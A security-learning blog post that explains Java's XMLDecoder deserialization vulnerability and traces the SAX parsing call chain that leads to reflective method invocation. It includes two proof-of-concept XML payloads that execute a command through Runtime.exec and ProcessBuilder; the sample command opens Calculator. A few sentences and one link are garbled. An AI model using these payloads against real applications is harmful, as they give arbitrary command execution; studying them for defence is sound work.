# Java Security Learning—XMLDecode Deserialization

Author: H3rmesk1t

Data: 2022.03.03

# XMLDecode
## Introduction
`XMLDecoder` is a class that comes with `java` that parses `xml` in `SAX`. It is used to deserialize the content of the `xml` document created by `XMLEncoder` into a `Java` object, located under the `java.beans` package. `XMLDecoder` has a security risk of deserialization vulnerability in `JDK 1.4`~`JDK 11`. Any command can be executed when deserializing specially constructed data.

## Serialization usage
First use `XMLEncode` to serialize a `xml` file:

```java
package org.h3rmesk1t.XMLDecode;

import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 5:12 pm
 */
public class EncodeDemo {

    public static void main(String[] args) throws Exception {

        XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("src/main/java/org/h3rmesk1t/XMLDecode/EncodeDemo.xml")));
        String name = "h3rmesk1t";
        xmlEncoder.writeObject(name);
        xmlEncoder.close();
    }
}
```

Serialized output result:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
 <string>h3rmesk1t</string>
</java>
```

Then use `XMLDecode` to deserialize the previously generated `xml` file content:

```java
package org.h3rmesk1t.XMLDecode;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 5:18 pm
 */
public class DecodeDemo {

    public static void main(String[] args) throws Exception {

        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream("src/main/java/org/h3rmesk1t/XMLDecode/EncodeDemo.xml")));
        Object object = xmlDecoder.readObject();
        System.out.println(object);
        xmlDecoder.close();
    }
}
```

Deserialization output result:

```text
h3rmesk1t
```

## XML Common Tag Description
 - `string` tag: `h3rmesk1t` string is represented in `XML` as `<string>h3rmesk1t</string>`
 - `object` tag: The object is represented by the `object` tag, in which the `class` attribute specifies a specific class (used to call its internal methods), and the `method` attribute specifies a specific method name. For example, `Runtime.getRuntime()` is represented as the following form:

```xml
<object class="java.lang.Runtime" method="getRuntime">
</object>
```

 - `void` tag: Use the `void` tag to represent function calls, assignments and other operations. In the `method` attribute, specify the specific method name. For example, `JButton jButton = new JButton();jButton.setText("Hello, h3rmesk1t");` is represented as the following form:

```xml
<object class="java.swing.JButton">
    <void method="setText">
    <string>Hello, h3rmesk1t</string>
    </void>
</object>
```

 - `array` tag: represents an array through the `array` tag, in which the `class` attribute specifies a specific class, the `index` attribute of the internal `void` tag represents assignment according to the specified array index. For example, `String[] string = new String[5];s[4] = "Hello, h3rmesk1t";` is expressed as the following form:

```xml
<array class="java.lang.String" length="5">
    <void index="4">
    <string>Hello, h3rmesk1t</string>
    </void>
</array>
```

 - For more tag descriptions, please see [XML Syntax Rules](https://www.runoob.com/xml/xml-syntax.html)

# XMLDecode deserialization vulnerability
## Vulnerability Description
According to the mechanism of parsing `XML` and running code calls methods, construct malicious `XML` to parse and execute malicious code, so as to achieve the purpose of execution of arbitrary commands.

## POC
 - `Runtime.getRuntime().exec()` execute command.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="3">
                <void index="0">
                    <string>open</string>
                </void>
                <void index="1">
                    <string>-a</string>
                </void>
                <void index="2">
                    <string>Calculator</string>
                </void>
            </array>
        </void>
    </object>
</java>
```

 - `ProcessBuilder("cmd").start()` executes the command.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0">
                <string>open</string>
            </void>
            <void index="1">
                <string>-a</string>
            </void>
            <void index="2">
                <string>Calculator</string>
            </void>
        </array>
        <void method="start"></void>
    </object>
</java>
```

<div align=center><img src="./images/1.png"></div>

## Vulnerability Analysis
### SAX
As mentioned above, `XMLDecoder` is `ja
The va`'s own class that parses `xml` in `SAX`, let's first look at what `SAX` is.

`SAX` is `Simple API For XML`. There are two ways to parse `XML` in `Java`, namely `SAX` and `DOM`, the difference is:
 - The `DOM` parsing function is powerful, and can be added, deleted, modified and checked. During operation, the `XML` document will be read into memory as a document object, so it is suitable for small documents.
 - `SAX` parsing is to read content from beginning to end line by element, which is more inconvenient to modify, but it is suitable for large read-only documents.

`SAX` uses event-driven form to parse `XML` documents. Simply put, it is to do the corresponding callback method when the event is triggered. In `SAX`, some callback methods will be triggered when the beginning and end of the document, the beginning and end of the element, and encoding conversion operations are read. The corresponding event processing can be performed in these callback methods:
 - startDocument
 - endDocument
 - startElement
 - endElement
 - characters

Here I borrow [Y4er's Java XMLDecoder Deserialization analysis](https://y4er.com/post/java-xmldecoder/#:~:text=%E8%87%AA%E5%B7%B1%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8ESAX%E7%9A%84%E8%A Understand `XMLDecode` based on `SAX` parsing is implemented in 7%A3%E6%9E%90%E5%8F%AF%E4%BB%A5%E5%B8%AE%E6%88%91%E4%BB%AC%E6%9B%B4%E5%A5%BD%E7%9A%84%E7%90%86%E8%A7%A3XMLDecoder)

```java
package org.h3rmesk1t.XMLDecode;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/3 6:29 pm
 */
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.File;

public class DemoHandler extends DefaultHandler {
    public static void main(String[] args) {
        SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();
        try {
            SAXParser parser = saxParserFactory.newSAXParser();
            DemoHandler dh = new DemoHandler();
            String path = "src/main/java/org/h3rmesk1t/XMLDecode/POC1.xml";
            File file = new File(path);
            parser.parse(file, dh);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void characters(char[] ch, int start, int length) throws SAXException {
        System.out.println("characters()");
        super.characters(ch, start, length);
    }

    @Override
    public void startDocument() throws SAXException {
        System.out.println("startDocument()");
        super.startDocument();
    }

    @Override
    public void endDocument() throws SAXException {
        System.out.println("endDocument()");
        super.endDocument();
    }

    @Override
    public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
        System.out.println("startElement()");
        for (int i = 0; i < attributes.getLength(); i++) {
            // getQName() is to get the attribute name
            System.out.print(attributes.getQName(i) + "=\"" + attributes.getValue(i) + "\"\n");
        }
        super.startElement(uri, localName, qName, attributes);
    }

    @Override
    public void endElement(String uri, String localName, String qName) throws SAXException {
        System.out.println("endElement()");
        System.out.println(uri + localName + qName);
        super.endElement(uri, localName, qName);
    }
}
```

The result of the output call is as follows. You can see that by inheriting the `DefaultHandler` class of `SAX` and rewriting its event method, you can get the nodes, attributes and values ​​corresponding to `XML`. `XMLDecoder` is also an XML` parsing based on `SAX`, but after getting the nodes, attributes, and values, it creates objects and calls methods through `Expression`.

```xml
startDocument()
startElement()
version="1.8.0_66"
class="java.beans.XMLDecoder"
characters()
startElement()
class="java.lang.Runtime"
method="getRuntime"
characters()
startElement()
method="exec"
characters()
startElement()
class="java.lang.String"
length="3"
characters()
startElement()
index="0"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
startElement()
index="1"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
startElement()
index="2"
characters()
startElement()
characters()
endElement()
string
characters()
endElement()
void
characters()
endElement()
array
characters()
endElement()
void
characters()
endElement()
object
characters()
endElement()
java
endDocument()
```

###Process Call
At the breakpoint at `XMLDecoder.readObject`, follow up on the `readObejct` method, and continue to follow up on the `parsingComplete` method in the judgment statement. `this.handler` is `DocumentHandler`.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

<div align=center><img src="./images
/4.png"></div>

Follow up on `com.sun.beans.decoder.DocumentHandler#parse`, in the `run` method, an instance will be created through the `SAXParserFactory` factory, and then call `newSAXParser` to obtain the `SAX` parser, and call the `parse` method to parse.

<div align=center><img src="./images/5.png"></div>

Then follow up on the `com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse` method, and call the `determineDocVersion` method.

<div align=center><img src="./images/7.png"></div>

Follow up on the `com.sun.org.apache.xerces.internal.impl.XMLVersionDetector#determineDocVersion` method, and found that this is mainly to obtain the `XML` entity scanner, and then scan and parse `<?xml version=...?>` to obtain the version information of the `XML` document.

<div align=center><img src="./images/8.png"></div>

After obtaining the version information, go back to the `com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse` method, call `startDocumentParsing` to reset the scanner's version configuration and call the `startEntity` method.

<div align=center><img src="./images/9.png"></div>

<div align=center><img src="./images/10.png"></div>

Follow up on the `com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl#startEntity` method, you can see that at the end, `DocumentHandler#startDocument` will be called to clear the current object and handle and prepare to scan the file.

<div align=center><img src="./images/11.png"></div>

<div align=center><img src="./images/12.png"></div>

Then go back to the `com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse` method, call the `scanDocument` method to start file scanning.

<div align=center><img src="./images/13.png"></div>

Follow up on the `com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl#scanDocument` method, after setting the entity handle, execute the `do-while` loop and use the `switch-case` statement to make judgments. It includes scanning identification of `START_DOCUMENT`, `START_ELEMENT`, `CHARACTERS`, `SPACE`, `ENTITY_REFERENCE`, `PROCESSING_INSTRUCTION`, `COMMENT`, `DTD`, `CDATA`, `NOTATION_DECLARATION`, `ENTITY_DECLARATION`, `NAMESPACE`, `ATTRIBUTE`, `END_ELEMENT`, etc.

<div align=center><img src="./images/14.png"></div>

When judging `END_ELEMENT`, follow up all the way to `ElementHandler#endElement`, follow up to `ObjectElementHandler#getValueObject`, and gradually take out `open`, `-a`, and `Calculator`,

<div align=center><img src="./images/15.png"></div>

<div align=center><img src="./images/16.png"></div>

<div align=center><img src="./images/17.png"></div>

<div align=center><img src="./images/18.png"></div>

Continue to follow up to `ObjectElementHandler#getValueObject`, you can see that the variables `var3` and `var4` are obtained as the class name of the `Runtime` and the method name of the `exec` respectively.

<div align=center><img src="./images/19.png"></div>

Then call `Expression#getValue`, follow up to `Statement#invoke`, then follow up to `Statement#invokeInternal`, and finally call `MethodUtil#invoke` to implement reflection execution of any class methods.

<div align=center><img src="./images/20.png"></div>

<div align=center><img src="./images/21.png"></div>

<div align=center><img src="./images/22.png"></div>

# refer to
 - [Java XMLDecoder Deserialization Analysis](https://y4er.com/post/java-xmldecoder/)